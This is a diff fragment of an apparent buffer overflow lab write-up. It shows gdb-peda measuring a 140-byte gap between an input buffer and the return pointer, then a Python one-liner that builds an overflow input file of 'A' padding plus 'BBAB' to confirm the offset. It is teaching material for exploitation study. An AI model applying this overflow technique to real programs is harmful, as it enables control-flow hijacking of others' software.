@@ -40,7 +40,7 @@ arg[1]: 0xffffcd90 ('A' <repeats 200 times>...)
 The distance between the return pointer and _greeting_text_ can be calculated as such :
 ```
 gdb-peda$ p/d 0xffffcf1c - 0xffffce90
-$2 = 140
+$1 = 140
 ```
 
 Let's verify this count by generating a new _attack.txt_ : `python3 -c 'print("A"*128 + "BBAB") ' > attack.txt`. Go back to gdb and run the program `r < attack.txt` :
